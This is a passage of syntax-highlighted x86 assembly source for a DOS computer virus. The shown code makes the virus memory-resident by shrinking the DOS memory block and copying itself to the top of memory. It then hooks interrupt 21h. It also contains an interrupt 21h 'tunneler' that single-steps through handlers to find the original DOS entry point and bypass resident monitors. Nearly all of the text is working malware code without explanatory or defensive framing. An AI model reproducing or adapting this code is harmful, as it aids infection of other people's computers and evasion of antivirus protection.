         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">popf</span><span class="sc0">            </span><span class="sc1">; Load flags from stack (AX)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">      </span><span class="sc1">; Get current PSP address</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; DS = segment of PSP for current ...</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = segment of first byte beyon...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,((</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">)*</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Subtract number of paragraphs to...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store new segment of first byte ...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; CX = segment of PSP for current ...</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Subtract segment of PSP for curr...</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; CX = segment of last MCB in chain</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; DS =    "    "   "    "  "    "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store new size of memory block i...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (AX)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Zero SI</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move virus to top of memory</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; ES = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; DI = offset of interrupt vector 21h</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">int21_virus</span><span class="sc0">  </span><span class="sc1">; AX = offset of int21_virus</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt offset 21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Set interrupt segment 21h</span><span class="sc0">

         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tunneler</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Interrupt 21h tunneler</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; BX = code segment</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Not equal to data- and extra se...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_zero_seg</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_zero_seg</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">code_seg_tst</span><span class="sc0">
</span><span class="sc5">tst_zero_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; BX = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Not equal to data- and extra se...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_cs_seg</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to test_cs_seg</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">zero_seg_tst</span><span class="sc0">
</span><span class="sc5">test_cs_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">
</span><span class="sc5">test_cs_seg_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; BP = stack pointer</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Code segment equal to segment of...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tunnel_exit_</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tunnel_exit_</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">0f000h</span><span class="sc0">     </span><span class="sc1">; DOS data segment?</span><span class="sc0">
</span><span class="sc5">dos_data_seg</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">  </span><span class="sc1">; DOS data segment</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_opcode</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_opcode</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ES:AX = pointer to interrupt 21h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">1111111011111111b</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tunnel_exit_</span><span class="sc0">
</span><span class="sc5">test_opcode</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:SI = pointer to interrupt 21h</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = opcode of interrupt 21h</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9dh</span><span class="sc0">      </span><span class="sc1">; POPF (opcode 9dh)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_pushf</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to test_pushf</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">0000000100000000b</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">tunnel_exit</span><span class="sc0">
</span><span class="sc5">test_pushf</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc0">      </span><span class="sc1">; PUSHF (opcode 9ch)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_iret</span><span class="sc0">       </span><span class="sc1">; Not equal? Jump to test_iret</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pushf_simula</span><span class="sc0">
</span><span class="sc5">test_iret</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc0">         </span><span class="sc1">; IRET (opcode 0cfh)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_dec_sp</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to test_dec_sp</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">0000000100000000b</span><span class="sc0">
</span><span class="sc5">tunnel_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">tunnel_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Load BP from stack</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_dec_sp</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">      </span><span class="sc1">; DEC SP (opcode 4ch)?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">tunnel_exit</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to tunnel_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = instruction pointer of inte...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store instruction pointer of int...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Save DI at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">          </span><span class="sc1">; Save SS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (SS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; SI = stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DI = stack pointer</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; DI = offset of end of stack</span><span class="sc0">
</span><span class="sc5">move_stack</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AL = word of stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store word of stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; End of stack?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">move_stack</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to move_stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01000011b</span><span class="sc0">    </span><span class="sc1">; AL = low-order 8-bits of flags</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">07h</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">     </span><span class="sc1">; Store low-order 8-bits of flags</span><span class="sc0">

         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">          </span><span class="sc1">; Decrease SP</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Load DI from stack</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">code_seg_tst</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">int24_exit</span><span class="sc0">   </span><span class="sc1">; BP = offset of int24_exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DS =   "    "      "</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">tunneler</span><span class="sc0">     </span><span class="sc1">; BP = offset of tunneler</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_mod_reg</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">zero_seg_tst</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">          </span><span class="sc1">; Save BP at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Save DS at stack</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc5">int01_addr</span><span class="sc0">   </span><span class="sc1">; BP = offset of int01_addr</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DS =   "    "      "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,(</span><span class="sc2">01h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; BP = offset of interrupt vector 01h</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">exam_mod_reg</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">      </span><span class="sc1">; Found offset of interrupt table?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">tst_data_seg</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to tst_data_seg</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">tst_data_seg</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = data segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Segment of interrupt vector table?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">mov_cs_to_ds</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to mov_cs_to_ds</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jump_test_cs</span><span class="sc0">
</span><span class="sc5">mov_cs_to_ds</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">
</span><span class="sc5">jump_test_cs</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">
</span><span class="sc5">pushf_simula</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = instruction pointer of inte...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store instruction pointer of int...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">          </span><span class="sc1">; Save SS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (SS)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">       </span><span class="sc1">; SI = stack pointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; DI = stack pointer</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; DI = offset of end of stack</span><span class="sc0">
</span><span class="sc5">move_stack_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AL = word of stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store word of stack</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; End of stack?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">move_stack_</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to move_stack_</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Subtract two from SP</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save flags at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Load flags from stack</span><span class="sc0">

         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">1111111011111111b</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">        </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_cs_seg_</span><span class="sc0">

</span><span class="sc5">test_segment</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Test data- and extra segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; AX = data segment</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Equal to data segment</span><span class="sc0">
